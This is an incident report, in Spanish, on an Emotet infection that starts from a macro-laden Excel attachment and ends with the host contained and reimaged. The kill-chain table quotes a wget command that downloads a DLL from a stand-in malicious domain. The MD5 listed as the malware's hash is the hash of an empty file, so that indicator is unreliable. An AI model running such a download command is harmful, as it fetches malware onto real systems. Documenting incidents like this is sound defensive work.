# Reporte de Incidente IR-2026-002

| Campo | Valor |
|-------|-------|
| ID | IR-2026-002 |
| Título | Beacon C2 hacia infraestructura Emotet desde WKS-042 |
| Severidad | Critical |
| Estado | Erradicado |
| Reportado por | Correlation search `SOC - UC-007 C2 Beacon vs MISP IoC` |
| Fecha detección | 2026-08-27 14:22 UTC |
| Fecha resolución | 2026-08-27 21:15 UTC |
| Analistas | L2 mlopez, L3 fgarcia |
| Playbooks | `suspicious-outbound.md`, `malware-response.md` |
| Caso TheHive | #TH-2026-197 |

## Resumen ejecutivo

Se detectó tráfico HTTP saliente desde `WKS-042` (172.31.0.42, usuario `apereira`) hacia `malware-tracker.evil` — dominio publicado en el feed MISP como infraestructura Emotet (`ioc_confidence: 85`). El host fue aislado, el binario responsable identificado y removido. Vector inicial: adjunto malicioso Excel con macro en correo dirigido.

## Kill-chain

| Etapa | Evidencia |
|-------|-----------|
| Delivery | Correo de `finanzas@fake-vendor.com` con adjunto `Factura-2026-08.xlsm`, 14:03 UTC. |
| Exploitation | Macro VBA descargó `wget https://malware-tracker.evil/em.dll` — Sysmon EID 3. |
| Installation | `regsvr32.exe` cargó `em.dll` desde `%APPDATA%\Roaming\Micrsoft\` (typo característico). |
| C2 | Beacons HTTP GET a `malware-tracker.evil/gate.php` cada 60s ± 15s jitter. |
| Actions | No se llegó a exfiltración — detectado a los 19 min del primer beacon. |

## Timeline

| UTC | Evento |
|-----|--------|
| 14:03 | Correo recibido — SEG no lo detectó (macro nueva, no firma). |
| 14:05 | Usuario abre archivo y habilita macros. |
| 14:06 | Descarga de `em.dll` desde `malware-tracker.evil` (Suricata SID 9000020 — UA sospechoso). |
| 14:07 | Primer beacon HTTP. |
| 14:22 | Splunk dispara UC-007 (match en feed MISP). |
| 14:25 | L2 acepta caso; enriquece IoC con Cortex (VirusTotal: 45/72). |
| 14:38 | Aislamiento de WKS-042 vía EDR. |
| 14:52 | Se identifica `em.dll` con hash `d41d8cd98f00b204e9800998ecf8427e`. |
| 15:20 | Análisis Cortex sandbox confirma familia Emotet. |
| 16:30 | Reimagen de WKS-042. |
| 17:00 | Correo eliminado de todos los buzones (búsqueda global) — 12 usuarios más lo tenían sin abrir. |
| 21:15 | Caso cerrado. |

## Contención

1. EDR quarantine de WKS-042 (aislamiento total).
2. Bloqueo de `malware-tracker.evil` y `45.155.204.24` en DNS RPZ + NGFW.
3. Hash `d41d…f8427e` bloqueado en EDR corporativo.
4. Búsqueda global del correo → eliminado de 12 buzones.

## Erradicación

- Reimagen del host desde Golden Image.
- Reset de contraseña de `apereira` (aunque no hubo evidencia de exfiltración de credenciales).
- Escaneo AV/EDR en los 12 buzones que recibieron el correo — negativo.

## Lecciones aprendidas

1. **La macro no fue detectada por el SEG.** Se elevó el nivel de sandbox a "detonate all Office w/ macros".
2. **AppLocker no estaba bloqueando `regsvr32.exe` desde `%APPDATA%`.** Nueva política emitida.
3. **Feed MISP funcionó perfectamente** — el IoC `malware-tracker.evil` fue añadido 3 días antes. Sin él, la detección hubiera dependido de EDR (que también falló al inicio).
4. Se creó regla YARA para variantes de `em.dll`.

## IoCs (publicados en MISP interno TLP:AMBER)

| Tipo | Valor |
|------|-------|
| domain | malware-tracker.evil |
| ip | 45.155.204.24 |
| md5 | d41d8cd98f00b204e9800998ecf8427e |
| filename | Factura-2026-08.xlsm |
| email-src | finanzas@fake-vendor.com |
